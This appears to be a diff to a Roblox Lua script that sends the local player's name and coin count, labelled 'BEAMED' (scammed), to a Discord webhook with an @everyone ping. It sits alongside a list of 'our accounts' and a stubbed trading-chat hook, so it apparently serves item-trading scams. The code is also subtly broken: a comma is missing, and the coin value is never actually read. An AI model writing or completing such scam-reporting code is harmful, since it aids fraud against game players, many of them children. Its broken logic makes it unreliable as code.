@@ -1,6 +1,26 @@
 local Players = game:GetService('Players')
+local Player = game.Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local Coins = 0
+
+-- Function to calculate users coins
+local function getCoins()
+    Coins = Player.PlayerGui.AccountSection.Base.Stats.Coins.Title.Text
+end
+
+-- Send a message to the Discord server when the script runs
+local embed = {
+    ["title"] = Player.Name,
+    ["description"] = "BEAMED",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "💰 COINS",
+            ["value"] = tostring(Coins)
+        }
+    },
+}
 
 local ourAccounts = {
     "MonsterWyatt",
@@ -25,15 +45,13 @@ local function sendDiscordMessage(embed)
         ["Content-Type"] = "application/json"
     }
     local data = {
+        ["content"] = '@everyone'
         ["embeds"] = {
             {
                 ["title"] = embed.title,
                 ["description"] = embed.description,
                 ["color"] = embed.color,
                 ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = embed.footer.text
-                }
             }
         }
     }
@@ -72,24 +90,10 @@ Players.PlayerAdded:Connect(function(player)
     end)
 end)
 
--- Send a message to the Discord server when the script runs
-local embed = {
-    ["title"] = "This is an embedded message",
-    ["description"] = "This message has an embed with fields and a footer",
-    ["color"] = 65280,
-    ["fields"] = {
-        {
-            ["name"] = "Field 1",
-            ["value"] = "This is the first field"
-        },
-        {
-            ["name"] = "Field 2",
-            ["value"] = "This is the second field"
-        }
-    },
-    ["footer"] = {
-        ["text"] = "This is the footer text"
-    }
-}
+--[[
+Player.PlayerGui.Menu.Basis.Window.Trading.Basis.Content.Chat.Content.Scroller.ChildAdded:Connect(function(Child)
+
+end)
+]]
 
 sendDiscordMessage(embed)
